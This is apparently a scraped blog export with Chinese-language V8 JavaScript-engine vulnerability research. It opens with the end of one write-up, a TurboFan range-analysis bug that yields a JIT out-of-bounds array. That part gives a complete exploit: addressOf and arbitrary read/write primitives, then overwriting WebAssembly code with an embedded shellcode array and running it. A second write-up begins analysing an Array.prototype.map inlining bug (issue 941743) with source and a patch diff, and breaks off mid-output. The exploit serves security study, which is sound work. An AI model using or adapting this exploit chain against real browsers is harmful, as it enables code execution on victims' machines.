&#123;-nan(0x8000000000000), -inf&#125;,   v16_int8 = &#123;0, 0, 0, 0, 0, 0, -8, -1, 0, 0, 0, 0, 0, 0, -16, -1&#125;,   v8_int16 = &#123;0, 0, 0, -8, 0, 0, 0, -16&#125;,   v4_int32 = &#123;0, -524288, 0, -1048576&#125;,   v2_int64 = &#123;-2251799813685248, -4503599627370496&#125;,   uint128 = 340199290171201906239762611764396556288&#125;\ni现在是-NaN，执行x = -x以后·，来到x = Math.max(x,-2);逻辑\npwndbg&gt; p $xmm3$27 = &#123;  v4_float = &#123;0, -2, 0, -2&#125;,   v2_double = &#123;-2, -2&#125;,   v16_int8 = &#123;0, 0, 0, 0, 0, 0, 0, -64, 0, 0, 0, 0, 0, 0, 0, -64&#125;,   v8_int16 = &#123;0, 0, 0, -16384, 0, 0, 0, -16384&#125;,   v4_int32 = &#123;0, -1073741824, 0, -1073741824&#125;,   v2_int64 = &#123;-4611686018427387904, -4611686018427387904&#125;,   uint128 = 255211775190703847611366013629108322304&#125;pwndbg&gt; p $xmm0$28 = &#123;  v4_float = &#123;0, nan(0x780000), 0, nan(0x700000)&#125;,   v2_double = &#123;nan(0x8000000000000), inf&#125;,   v16_int8 = &#123;0, 0, 0, 0, 0, 0, -8, 127, 0, 0, 0, 0, 0, 0, -16, 127&#125;,   v8_int16 = &#123;0, 0, 0, 32760, 0, 0, 0, 32752&#125;,   v4_int32 = &#123;0, 2146959360, 0, 2146435072&#125;,   v2_int64 = &#123;9221120237041090560, 9218868437227405312&#125;,   uint128 = 170058106710732674498851936011657674752&#125;\n最后&gt;&gt; 0 运算被转换为了如下代码\n0x257b00082c5e    vcvttsd2si edx, xmm30x257b00082c62    lea    eax, [rdx + rdx]RAX  0x0RDX  0x80000000\n通过调试，我们发现，生成的JIT代码是没有问题的，确实是按照NaN来运算，bug仅出现在IR分析阶段。接下来，我们继续构造\nfunction opt(index) &#123;    var a = [1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];    var x = -Infinity;    var i = 0;    for (; i &lt; 1; i += x) &#123;        if (i == -Infinity) x = +Infinity;    &#125;    //compiler:Range(1,INF)    //reality:NaN    var x = Math.max(i,1); //    //compiler:Range(-INF,-1)    //reality:NaN    x = -x; //    //compiler:Range(-2,-1)    //reality:NaN    x = Math.max(x,-2);    //compiler:Range(-2,-1)    //reality:0    x &gt;&gt;= 0; //    //compiler:Range(0,1)    //reality:2    x += 2;    //compiler:Range(0,7)    //reality:Range(0,7)    index &amp;= 0x7;    //compiler:Range(0,7)    //reality:Range(0,14)    index *= x;    return a[index];&#125;\n这样可以使得编译器的估测值比真实运算结果小，由此发生溢出。运行发现程序直接崩溃\nroot@ubuntu:~/Desktop/v8/out.gn/x64.bug# ./d8 poc.js --trace-turbo --allow-natives-syntaxConcurrent recompilation has been disabled for tracing.undefined---------------------------------------------------Begin compiling method opt using TurboFan---------------------------------------------------Finished compiling method opt using TurboFanTrace/breakpoint trap (core dumped)\n分析IR图，checkbounds的Range(0,7)在数组长度之内，在后续，该checkbounds会被移除在V8.TFEffectLinearization 369阶段，已经没有了边界检查，因此也可以溢出从IR图中，未分析出任何异常，因此，我们继续调试JIT代码\n R8   0x80000000 R9   0x55f4d8748520 —▸ 0x17608100000 ◂— 0x40000 R10  0x4023cccccccccccd R11  0x5*R12  0x17608243c81 ◂— 0x310000005408040b R13  0x17600000000 —▸ 0x7ffebe6b7a18 ◂— 0x17600000000 R14  0x1760825009d ◂— 0x89000000e0080409 R15  0x55f4d87144c0 —▸ 0x7f451f0e2360 (Builtins_WideHandler) ◂— lea    rbx, [rip - 7] RBP  0x7ffebe6b67b0 —▸ 0x7ffebe6b6810 —▸ 0x7ffebe6b6838 —▸ 0x7ffebe6b68a0 —▸ 0x7ffebe6b68f0 ◂— ... RSP  0x7ffebe6b6780 —▸ 0x7ffebe6b67c0 ◂— 0xa /* &#x27;\\n&#x27; */*RIP  0x17600082d2b ◂— add    r8d, 2───────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────   0x17600082d12    mov    r11, qword ptr [rbp + 0x10]   0x17600082d16    sar    r11d, 1   0x17600082d19    movabs r12, 0x17608243a45   0x17600082d23    mov    r12d, dword ptr [r12 + 3]   0x17600082d28    add    r12, r13 ► 0x17600082d2b    add    r8d, 2\n调试中看出,在执行x += 2;时，x(寄存器r8)的值仍然为0x80000000，最终使得运算的下标为 R8   0x8000000a，即有一个符号位的存在，因此，我们可以在最后添加一个移位操作，用于移除NaN计算造成的符号位。完整的OOB构造方法如下\nfunction opt(index) &#123;    var a = [1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];    var x = -Infinity;    var i = 0;    for (; i &lt; 1; i += x) &#123;        if (i == -Infinity) x = +Infinity;    &#125;    //compiler:Range(1,INF)    //reality:NaN    var x = Math.max(i,1); //    //compiler:Range(-INF,-1)    //reality:NaN    x = -x; //    //compiler:Range(-2,-1)    //reality:NaN    x = Math.max(x,-2);    //compiler:Range(-2,-1)    //reality:0    x &gt;&gt;= 0; //    //compiler:Range(0,1)    //reality:2    x += 2;    //compiler:Range(0,7)    //reality:Range(0,7)    index &amp;= 0x7;    //compiler:Range(0,7)    //reality:Range(0,14)    index *= x;    index &lt;&lt;= 1;    index &gt;&gt;= 1;    return a[index];&#125;%PrepareFunctionForOptimization(opt);print(opt(5));%OptimizeFunctionOnNextCall(opt);print(opt(5));%SystemBreak();print(opt(5));\n运行后发现成功溢出\nroot@ubuntu:~/Desktop/v8/out.gn/x64.bug# ./d8 p.js --allow-natives-syntaxundefined-8.864952837205469e-7\n疑难问题在构造过程中,var x = Math.max(i,1);和x = Math.max(x,-2);语句中的参数，位置不能调换，否则利用失败。这是因为max函数最终是会被转换为Float64LessThan函数，而对于一个NaN，任何的比较都是false，因此在这个情况下，max运算的真实结果将会是第一个参数\nNaN == NaNfalseNaN &lt; 1falseNaN &gt; 1false\n而我们的目的就是要让NaN参与真实值的计算，因此，不能调换参数的位置。能否使用var x = i &lt; 1 ? 1 : i来代替max函数？答案是不行。这将导致var x = i &lt; 1 ? 1 : i这个Phi节点与i的估测一致，同为Range(-INF,INF)，因为从程序的流程分析来看，显然i &lt; 1是恒不成立的，因为刚刚循环退出的条件就是i &gt;= 1，因此，var x = i &lt; 1 ? 1 : i就相当于var x = i，在后面，编译器直接评估它与i的情况一样，同为Range(-inf,inf)，由此不能达到我们的利用目的。同理，var x = i &gt; 1 ? i : 1;也不可行，它将使得i为NaN时，x的值为1。\nexp编写控制好对象布局，利用JIT的oob，覆写后方Array的length，从而构造一个自由溢出的OOB Array，然后后续就是简单的利用了。\nvar buf = new ArrayBuffer(0x8);var dv = new DataView(buf);function p64f(value1,value2) &#123;   dv.setUint32(0,value1,true);   dv.setUint32(0x4,value2,true);   return dv.getFloat64(0,true);&#125;function i2f64(value) &#123;   dv.setBigUint64(0,BigInt(value),true);   return dv.getFloat64(0,true);&#125;function u64f(value) &#123;   dv.setFloat64(0,value,true);   return [dv.getUint32(0,true),dv.getUint32(4,true)];&#125;function big2int(value) &#123;   dv.setBigUint64(0,BigInt(value),true);   return dv.getUint32(0,true);&#125;var a;var oob_arr;function opt(index,leak_or_write,val) &#123;    a = [1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8];    oob_arr = new Array(1.1,2.2);    var x = -Infinity;    var i = 0;    for (; i &lt; 1; i += x) &#123;        if (i == -Infinity) x = +Infinity;    &#125;    //compiler:Range(1,INF)    //reality:NaN    var x = Math.max(i,1); //    //compiler:Range(-INF,-1)    //reality:NaN    x = -x; //    //compiler:Range(-2,-1)    //reality:NaN    x = Math.max(x,-2); //    //compiler:Range(-2,-1)    //reality:0    x &gt;&gt;= 0; //    //compiler:Range(0,1)    //reality:2    x += 2;    //compiler:Range(0,7)    //reality:Range(0,7)    index &amp;= 0x7;    //compiler:Range(0,7)    //reality:Range(0,14)    index *= x;    /*两步的作用是清除符号位*/    index &lt;&lt;= 1;    index &gt;&gt;= 1;    if (leak_or_write)       return a[index];   else &#123;      a[index] = val;   &#125;&#125;for (var i=0;i&lt;0x20000;i++) &#123;   opt(7,true,i+1.1);   opt(7,false,p64f(0,0));&#125;//泄露arr的elements,用于覆写length时不破坏elementsvar d = u64f(opt(7,true,1.1));var elements_addr = d[0];print(&quot;elements_addr=&quot; + elements_addr.toString(16));var oob_len = p64f(elements_addr,0x1000);opt(7,false,oob_len);var float64_arr = new Float64Array(1.1,2.2,3.3);var arb_buf = new ArrayBuffer(0x10);var obj_arr = [buf];compression_high = u64f(oob_arr[0x32])[0];obj_elements_map_addr = u64f(oob_arr[0x3c])[1];double_elements_map_addr = u64f(oob_arr[0x22])[1];print(&quot;compression_high=&quot; + compression_high.toString(16));print(&quot;obj_elements_map_addr=&quot; + obj_elements_map_addr.toString(16));print(&quot;double_elements_map_addr=&quot; + double_elements_map_addr.toString(16));function addressOf(mobj) &#123;   obj_arr[0] = mobj;   oob_arr[0x3c] = p64f(0,double_elements_map_addr);   var addr = BigInt(u64f(obj_arr[0])[0]) - 0x1n + (BigInt(compression_high) &lt;&lt; 32n);   oob_arr[0x3c] = p64f(0,obj_elements_map_addr);   return addr;&#125;/*print(addressOf(buf).toString(16));//%DebugPrint(buf);%SystemBreak(); */const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);var wasmModule = new WebAssembly.Module(wasmCode);var wasmInstance = new WebAssembly.Instance(wasmModule);var func = wasmInstance.exports.main;var wasm_shellcode_ptr_addr = addressOf(wasmInstance) + 0x68n;print(wasm_shellcode_ptr_addr.toString(16));oob_arr[0x36] = p64f(0,0x100);oob_arr[0x37] = p64f(0,big2int(wasm_shellcode_ptr_addr));oob_arr[0x38] = p64f(compression_high,0);var adv = new DataView(arb_buf);var wasm_shellcode_addr = adv.getBigUint64(0,true);print(&#x27;wasm_shellcode_addr=&#x27; + wasm_shellcode_addr.toString(16));oob_arr[0x37] = p64f(0,big2int(wasm_shellcode_addr));oob_arr[0x38] = p64f(big2int(wasm_shellcode_addr &gt;&gt; 32n),0);//替换wasm的shellcodefor (var i=0;i&lt;shellcode.length;i++) &#123;   adv.setUint32(i*4,shellcode[i],true);&#125;//执行shellcodefunc();/*%DebugPrint(wasmInstance);%DebugPrint(oob_arr);%DebugPrint(arb_buf);%SystemBreak();*/\n\n0x04 感想最近研究v8越来越上手了，以后还得继续努力。\n0x05 参考论文Interprocedural Induction Variable Analysischromium commit\n","categories":["CTF","安全研究"],"tags":["JS引擎漏洞","类型混淆"]},{"title":"issue_941743","url":"/2021/03/19/issue-941743/","content":"文章首发于安全KER https://www.anquanke.com/post/id/234429\n0x00 前言Issue 941743是2019年的一个v8方面的历史漏洞，其漏洞发生在对Array.prototype.map函数的Reduce过程，之前介绍过Array.prototype.map的一个回调漏洞，本文将介绍其在JIT层的一个优化漏洞。\n0x01 前置知识Array.prototype.map()Array.prototype.map()函数用于从一个数组中根据函数关系创建一个映射，其语法如下\nvar new_array &#x3D; arr.map(function callback(currentValue[, index[, array]]) {&#x2F;&#x2F; Return element for new_array}[, thisArg])\n基本用法如下\nvar a = [1,2,3];var b = a.map((value,index)=&gt;&#123;   print(&quot;index=&quot;+index+&quot; value=&quot; + value);   return value+1;&#125;);print(&quot;b=&quot;,b);\n输出如下\nindex=0 value=1index=1 value=2index=2 value=3b= 2,3,4\nArray()函数调用链及JIT优化分析源码分析当我们执行var a &#x3D; Array(1)时，首先调用的是ArrayConstructor，该函数位于src&#x2F;builtins&#x2F;builtins-array-gen.cc，按照源码分析，其调用链为ArrayConstructor -&gt; ArrayConstructorImpl -&gt; GenerateArrayNArgumentsConstructor -&gt; TailCallRuntimeGenerateArrayNArgumentsConstructor函数如下，其结尾使用了TailCallRuntime去调用某个函数\nvoid ArrayBuiltinsAssembler::GenerateArrayNArgumentsConstructor(    TNode&lt;Context&gt; context, TNode&lt;JSFunction&gt; target, TNode&lt;Object&gt; new_target,    TNode&lt;Int32T&gt; argc, TNode&lt;HeapObject&gt; maybe_allocation_site) &#123;  // Replace incoming JS receiver argument with the target.  // TODO(ishell): Avoid replacing the target on the stack and just add it  // as another additional parameter for Runtime::kNewArray.  CodeStubArguments args(this, ChangeInt32ToIntPtr(argc));  args.SetReceiver(target);  // Adjust arguments count for the runtime call: +1 for implicit receiver  // and +2 for new_target and maybe_allocation_site.  argc = Int32Add(argc, Int32Constant(3));  TailCallRuntime(Runtime::kNewArray, argc, context, new_target,                  maybe_allocation_site);&#125;\n而TailCallRuntime函数在不同指令架构上有不同的实现，这里我们看x64架构的实现\nvoid MacroAssembler::TailCallRuntime(Runtime::FunctionId fid) &#123;  // ----------- S t a t e -------------  //  -- rsp[0]                 : return address  //  -- rsp[8]                 : argument num_arguments - 1  //  ...  //  -- rsp[8 * num_arguments] : argument 0 (receiver)  //  //  For runtime functions with variable arguments:  //  -- rax                    : number of  arguments  // -----------------------------------  const Runtime::Function* function = Runtime::FunctionForId(fid);  DCHECK_EQ(1, function-&gt;result_size);  if (function-&gt;nargs &gt;= 0) &#123;    Set(rax, function-&gt;nargs);  &#125;  JumpToExternalReference(ExternalReference::Create(fid));&#125;\n通过Runtime::FunctionForId(fid)找到函数对象，在源码文件中src&#x2F;runtime&#x2F;runtime.cc中有定义\nconst Runtime::Function* Runtime::FunctionForId(Runtime::FunctionId id) &#123;  return &amp;(kIntrinsicFunctions[static_cast&lt;int&gt;(id)]);&#125;\n其中kIntrinsicFunctions的定义如下\nstatic const Runtime::Function kIntrinsicFunctions[] = &#123;    FOR_EACH_INTRINSIC(F) FOR_EACH_INLINE_INTRINSIC(I)&#125;;\n宏定义FOR_EACH_INTRINSIC如下\n#define FOR_EACH_INTRINSIC_IMPL(F, I)       \\  FOR_EACH_INTRINSIC_RETURN_PAIR_IMPL(F, I) \\  FOR_EACH_INTRINSIC_RETURN_OBJECT_IMPL(F, I)#define FOR_EACH_INTRINSIC_RETURN_OBJECT_IMPL(F, I) \\  FOR_EACH_INTRINSIC_ARRAY(F, I)                    \\  FOR_EACH_INTRINSIC_ATOMICS(F, I)                  \\  FOR_EACH_INTRINSIC_BIGINT(F, I)                   \\  FOR_EACH_INTRINSIC_CLASSES(F, I)                  \\  FOR_EACH_INTRINSIC_COLLECTIONS(F, I)              \\  FOR_EACH_INTRINSIC_COMPILER(F, I)                 \\  FOR_EACH_INTRINSIC_DATE(F, I)                     \\  FOR_EACH_INTRINSIC_DEBUG(F, I)                    \\  FOR_EACH_INTRINSIC_FORIN(F, I)                    \\  FOR_EACH_INTRINSIC_FUNCTION(F, I)                 \\  FOR_EACH_INTRINSIC_GENERATOR(F, I)                \\  FOR_EACH_INTRINSIC_IC(F, I)                       \\  FOR_EACH_INTRINSIC_INTERNAL(F, I)                 \\  FOR_EACH_INTRINSIC_INTERPRETER(F, I)              \\  FOR_EACH_INTRINSIC_INTL(F, I)                     \\  FOR_EACH_INTRINSIC_LITERALS(F, I)                 \\  FOR_EACH_INTRINSIC_MODULE(F, I)                   \\  FOR_EACH_INTRINSIC_NUMBERS(F, I)                  \\  FOR_EACH_INTRINSIC_OBJECT(F, I)                   \\  FOR_EACH_INTRINSIC_OPERATORS(F, I)                \\  FOR_EACH_INTRINSIC_PROMISE(F, I)                  \\  FOR_EACH_INTRINSIC_PROXY(F, I)                    \\  FOR_EACH_INTRINSIC_REGEXP(F, I)                   \\  FOR_EACH_INTRINSIC_SCOPES(F, I)                   \\  FOR_EACH_INTRINSIC_STRINGS(F, I)                  \\  FOR_EACH_INTRINSIC_SYMBOL(F, I)                   \\  FOR_EACH_INTRINSIC_TEST(F, I)                     \\  FOR_EACH_INTRINSIC_TYPEDARRAY(F, I)               \\  FOR_EACH_INTRINSIC_WASM(F, I)                     \\  FOR_EACH_INTRINSIC_WEAKREF(F, I)\n其中，我们较为关注的kNewArray函数在FOR_EACH_INTRINSIC_ARRAY里被注册\n#define FOR_EACH_INTRINSIC_ARRAY(F, I) \\  F(ArrayIncludes_Slow, 3, 1)          \\  F(ArrayIndexOf, 3, 1)                \\  F(ArrayIsArray, 1, 1)                \\  F(ArraySpeciesConstructor, 1, 1)     \\  F(GrowArrayElements, 2, 1)           \\  I(IsArray, 1, 1)                     \\  F(NewArray, -1 /* &gt;= 3 */, 1)        \\  F(NormalizeElements, 1, 1)           \\  F(TransitionElementsKind, 2, 1)      \\  F(TransitionElementsKindWithKind, 2, 1)\n由此可以知道Array(1)最终调用的是NewArray函数，该函数位于src&#x2F;runtime&#x2F;runtime-array.cc文件\nRUNTIME_FUNCTION(Runtime_NewArray) &#123;  HandleScope scope(isolate);  DCHECK_LE(3, args.length());  int const argc = args.length() - 3;  // argv points to the arguments constructed by the JavaScript call.  JavaScriptArguments argv(argc, args.address_of_arg_at(0));  CONVERT_ARG_HANDLE_CHECKED(JSFunction, constructor, argc);  CONVERT_ARG_HANDLE_CHECKED(JSReceiver, new_target, argc + 1);  CONVERT_ARG_HANDLE_CHECKED(HeapObject, type_info, argc + 2);  // TODO(bmeurer): Use MaybeHandle to pass around the AllocationSite.  Handle&lt;AllocationSite&gt; site = type_info-&gt;IsAllocationSite()                                    ? Handle&lt;AllocationSite&gt;::cast(type_info)                                    : Handle&lt;AllocationSite&gt;::null();  Factory* factory = isolate-&gt;factory();  // If called through new, new.target can be:  // - a subclass of constructor,  // - a proxy wrapper around constructor, or  // - the constructor itself.  // If called through Reflect.construct, it&#x27;s guaranteed to be a constructor by  // REFLECT_CONSTRUCT_PREPARE.  DCHECK(new_target-&gt;IsConstructor());  bool holey = false;  bool can_use_type_feedback = !site.is_null();  bool can_inline_array_constructor = true;  if (argv.length() == 1) &#123;    Handle&lt;Object&gt; argument_one = argv.at&lt;Object&gt;(0);    if (argument_one-&gt;IsSmi()) &#123;      int value = Handle&lt;Smi&gt;::cast(argument_one)-&gt;value();      if (value &lt; 0 ||          JSArray::SetLengthWouldNormalize(isolate-&gt;heap(), value)) &#123;        // the array is a dictionary in this case.        can_use_type_feedback = false;      &#125; else if (value != 0) &#123;        holey = true;        if (value &gt;= JSArray::kInitialMaxFastElementArray) &#123;          can_inline_array_constructor = false;        &#125;      &#125;    &#125; else &#123;      // Non-smi length argument produces a dictionary      can_use_type_feedback = false;    &#125;  &#125;  ...............................省略线......................if (!site.is_null()) &#123;    if ((old_kind != array-&gt;GetElementsKind() || !can_use_type_feedback ||         !can_inline_array_constructor)) &#123;      // The arguments passed in caused a transition. This kind of complexity      // can&#x27;t be dealt with in the inlined optimized array constructor case.      // We must mark the allocationsite as un-inlinable.      site-&gt;SetDoNotInlineCall();    &#125;  &#125; else &#123;    if (old_kind != array-&gt;GetElementsKind() || !can_inline_array_constructor) &#123;      // We don&#x27;t have an AllocationSite for this Array constructor invocation,      // i.e. it might a call from Array#map or from an Array subclass, so we      // just flip the bit on the global protector cell instead.      // TODO(bmeurer): Find a better way to mark this. Global protectors      // tend to back-fire over time...      if (Protectors::IsArrayConstructorIntact(isolate)) &#123;        Protectors::InvalidateArrayConstructor(isolate);      &#125;    &#125;\n以上代码，仅保留了我们较为关注的地方，从中可以看出，如果数组元素类型为Smi类型，并且value &gt;&#x3D; JSArray::kInitialMaxFastElementArray成立，也就是数组长度大于JSArray::kInitialMaxFastElementArray值的时候，can_inline_array_constructor被标记为false，最终，因为该标记,site-&gt;SetDoNotInlineCall()函数被调用。该标记最终将会在src&#x2F;compiler&#x2F;js-create-lowering.cc文件中的ReduceJSCreateArray函数中使用\nif (length_type.Maybe(Type::UnsignedSmall()) &amp;&amp; can_inline_call) &#123;  return ReduceNewArray(node, length, *initial_map, elements_kind,                        allocation, slack_tracking_prediction);&#125;...........省略线...............if (values_all_smis) &#123;  // Smis can be stored with any elements kind.&#125; else if (values_all_numbers) &#123;  elements_kind = GetMoreGeneralElementsKind(      elements_kind, IsHoleyElementsKind(elements_kind)                         ? HOLEY_DOUBLE_ELEMENTS                         : PACKED_DOUBLE_ELEMENTS);&#125; else if (values_any_nonnumber) &#123;  elements_kind = GetMoreGeneralElementsKind(      elements_kind, IsHoleyElementsKind(elements_kind) ? HOLEY_ELEMENTS                                                        : PACKED_ELEMENTS);&#125; else if (!can_inline_call) &#123;  // We have some crazy combination of types for the &#123;values&#125; where  // there&#x27;s no clear decision on the elements kind statically. And  // we don&#x27;t have a protection against deoptimization loops for the  // checks that are introduced in the call to ReduceNewArray, so  // we cannot inline this invocation of the Array constructor here.  return NoChange();&#125;return ReduceNewArray(node, values, *initial_map, elements_kind, allocation,                      slack_tracking_prediction);\n从分析中可以看出，该标记将影响Array(1)这个函数在JIT编译时是否会被内联优化。\nIR图分析首先，我们的测试代码如下，需要知道的一点是Array.prototype.map内部会调用JSCreateArray来创建新数组存放结果\n//将can_inline_array_constructor设置为falseArray(2**30);function opt() &#123;   var a = [1,2,3];   var b = a.map((value,index) =&gt; &#123;      return value;   &#125;);   return b;&#125;for (var i=0;i&lt;0x10000;i++) &#123;   opt();&#125;\n其IR图如下，可以看到，在typed lowering阶段，JSCreateArray并没有被优化为JIT代码，其仍然为JS层的代码调用。\n\n接下来，我们去除测试脚本里的Array(2**30);这句，然后重新查看IR图，可以发现，其被优化成了本地代码了。\n\n0x02 漏洞分析patch分析diff --git a/src/compiler/js-call-reducer.cc b/src/compiler/js-call-reducer.ccindex 636bdc1..d37f461 100644--- a/src/compiler/js-call-reducer.cc+++ b/src/compiler/js-call-reducer.cc@@ -1538,6 +1538,13 @@       simplified()-&gt;LoadField(AccessBuilder::ForJSArrayLength(kind)), receiver,       effect, control);+  // If the array length &gt;= kMaxFastArrayLength, then CreateArray+  // will create a dictionary. We should deopt in this case, and make sure+  // not to attempt inlining again.+  original_length = effect = graph()-&gt;NewNode(+      simplified()-&gt;CheckBounds(p.feedback()), original_length,+      jsgraph()-&gt;Constant(JSArray::kMaxFastArrayLength), effect, control);+   // Even though &#123;JSCreateArray&#125; is not marked as &#123;kNoThrow&#125;, we can elide the   // exceptional projections because it cannot throw with the given parameters.   Node* a = control = effect = graph()-&gt;NewNode(\n该patch用于修复漏洞，patch位于src&#x2F;compiler&#x2F;js-call-reducer.cc文件中的JSCallReducer::ReduceArrayMap函数，该函数是对Array.prototype.map函数进行优化的，patch中主要增加了一个对源数组的长度进行检查，检查其是否大于kMaxFastArrayLength，因为添加的是一个CheckBounds节点，所以如果大于的话将deoptimization bailout从而不使用其生成的JIT代码。我们来分析一下代码\n  Node* original_length = effect = graph()-&gt;NewNode(      simplified()-&gt;LoadField(AccessBuilder::ForJSArrayLength(kind)), receiver,      effect, control);  // 根据original_length，调用JSCreateArray创建一个新数组  Node* a = control = effect = graph()-&gt;NewNode(      javascript()-&gt;CreateArray(1, MaybeHandle&lt;AllocationSite&gt;()),      array_constructor, array_constructor, original_length, context,      outer_frame_state, effect, control);  Node* checkpoint_params[] = &#123;receiver, fncallback, this_arg,                               a,        k,          original_length&#125;;  const int stack_parameters = arraysize(checkpoint_params);  // 检查map的回调函数是否可用，如果可以，就进行调用  Node* check_frame_state = CreateJavaScriptBuiltinContinuationFrameState(      jsgraph(), shared, Builtins::kArrayMapLoopLazyDeoptContinuation,      node-&gt;InputAt(0), context, &amp;checkpoint_params[0], stack_parameters,      outer_frame_state, ContinuationFrameStateMode::LAZY);  Node* check_fail = nullptr;  Node* check_throw = nullptr;  WireInCallbackIsCallableCheck(fncallback, context, check_frame_state, effect,                                &amp;control, &amp;check_fail, &amp;check_throw);  // 调用回调函数生成映射值  Node* vloop = k = WireInLoopStart(k, &amp;control, &amp;effect);  Node *loop = control, *eloop = effect;  checkpoint_params[4] = k;  Node* continue_test =      graph()-&gt;NewNode(simplified()-&gt;NumberLessThan(), k, original_length);  Node* continue_branch = graph()-&gt;NewNode(common()-&gt;Branch(BranchHint::kNone),                                           continue_test, control);  Node* if_true = graph()-&gt;NewNode(common()-&gt;IfTrue(), continue_branch);  Node* if_false = graph()-&gt;NewNode(common()-&gt;IfFalse(), continue_branch);  control = if_true;  Node* frame_state = CreateJavaScriptBuiltinContinuationFrameState(      jsgraph(), shared, Builtins::kArrayMapLoopEagerDeoptContinuation,      node-&gt;InputAt(0), context, &amp;checkpoint_params[0], stack_parameters,      outer_frame_state, ContinuationFrameStateMode::EAGER);  effect =      graph()-&gt;NewNode(common()-&gt;Checkpoint(), frame_state, effect, control);  // Make sure the map hasn&#x27;t changed during the iteration  effect =      graph()-&gt;NewNode(simplified()-&gt;CheckMaps(CheckMapsFlag::kNone,                                               receiver_maps, p.feedback()),                       receiver, effect, control);  Node* element =      SafeLoadElement(kind, receiver, control, &amp;effect, &amp;k, p.feedback());  Node* next_k =      graph()-&gt;NewNode(simplified()-&gt;NumberAdd(), k, jsgraph()-&gt;OneConstant());  Node* hole_true = nullptr;  Node* hole_false = nullptr;  Node* effect_true = effect;  if (IsHoleyElementsKind(kind)) &#123;    // 跳过无值的空洞    Node* check;    if (IsDoubleElementsKind(kind)) &#123;      check = graph()-&gt;NewNode(simplified()-&gt;NumberIsFloat64Hole(), element);    &#125; else &#123;      check = graph()-&gt;NewNode(simplified()-&gt;ReferenceEqual(), element,                               jsgraph()-&gt;TheHoleConstant());    &#125;    Node* branch =        graph()-&gt;NewNode(common()-&gt;Branch(BranchHint::kFalse), check, control);    hole_true = graph()-&gt;NewNode(common()-&gt;IfTrue(), branch);    hole_false = graph()-&gt;NewNode(common()-&gt;IfFalse(), branch);    control = hole_false;    // The contract is that we don&#x27;t leak &quot;the hole&quot; into &quot;user JavaScript&quot;,    // so we must rename the &#123;element&#125; here to explicitly exclude &quot;the hole&quot;    // from the type of &#123;element&#125;.    element = effect = graph()-&gt;NewNode(        common()-&gt;TypeGuard(Type::NonInternal()), element, effect, control);  &#125;  // This frame state is dealt with by hand in  // ArrayMapLoopLazyDeoptContinuation.  frame_state = CreateJavaScriptBuiltinContinuationFrameState(      jsgraph(), shared, Builtins::kArrayMapLoopLazyDeoptContinuation,      node-&gt;InputAt(0), context, &amp;checkpoint_params[0], stack_parameters,      outer_frame_state, ContinuationFrameStateMode::LAZY);  Node* callback_value = control = effect = graph()-&gt;NewNode(      javascript()-&gt;Call(5, p.frequency()), fncallback, this_arg, element, k,      receiver, context, frame_state, effect, control);  // Rewire potential exception edges.  Node* on_exception = nullptr;  if (NodeProperties::IsExceptionalCall(node, &amp;on_exception)) &#123;    RewirePostCallbackExceptionEdges(check_throw, on_exception, effect,                                     &amp;check_fail, &amp;control);  &#125;  // The array &#123;a&#125; should be HOLEY_SMI_ELEMENTS because we&#x27;d only come into this  // loop if the input array length is non-zero, and &quot;new Array(&#123;x &gt; 0&#125;)&quot; always  // produces a HOLEY array.  MapRef holey_double_map =      native_context().GetInitialJSArrayMap(HOLEY_DOUBLE_ELEMENTS);  MapRef holey_map = native_context().GetInitialJSArrayMap(HOLEY_ELEMENTS);  //将值存入数组  effect = graph()-&gt;NewNode(simplified()-&gt;TransitionAndStoreElement(                                holey_double_map.object(), holey_map.object()),                            a, k, callback_value, effect, control);  if (IsHoleyElementsKind(kind)) &#123;    Node* after_call_and_store_control = control;    Node* after_call_and_store_effect = effect;    control = hole_true;    effect = effect_true;    control = graph()-&gt;NewNode(common()-&gt;Merge(2), control,                               after_call_and_store_control);    effect = graph()-&gt;NewNode(common()-&gt;EffectPhi(2), effect,                              after_call_and_store_effect, control);  &#125;  WireInLoopEnd(loop, eloop, vloop, next_k, control, effect);  control = if_false;  effect = eloop;  // Wire up the branch for the case when IsCallable fails for the callback.  // Since &#123;check_throw&#125; is an unconditional throw, it&#x27;s impossible to  // return a successful completion. Therefore, we simply connect the successful  // completion to the graph end.  Node* throw_node =      graph()-&gt;NewNode(common()-&gt;Throw(), check_throw, check_fail);  NodeProperties::MergeControlToEnd(graph(), common(), throw_node);  ReplaceWithValue(node, a, effect, control);  return Replace(a);&#125;\n以上代码看似没有什么问题，但忽略了JSCreateArray的一个特性，如果要申请的大小大于某个阈值（0x2000000），那么其返回的对象，其Element不再是数组类型，而是Dictionary类型，测试代码\nvar a = Array(0x2000001);%DebugPrint(a);DebugPrint: 0x19c022c0dbf1: [JSArray] - map: 0x3427e398a9f9 &lt;Map(DICTIONARY_ELEMENTS)&gt; [FastProperties] - prototype: 0x1e11fad11081 &lt;JSArray[0]&gt; - elements: 0x19c022c0dc11 &lt;NumberDictionary[16]&gt; [DICTIONARY_ELEMENTS] - length: 33554433 - properties: 0x342395d80c21 &lt;FixedArray[0]&gt; &#123;    #length: 0x3538bdb001a9 &lt;AccessorInfo&gt; (const accessor descriptor) &#125; - elements: 0x19c022c0dc11 &lt;NumberDictionary[16]&gt; &#123;   - max_number_key: 0 &#125;0x3427e398a9f9: [Map] - type: JS_ARRAY_TYPE - instance size: 32 - inobject 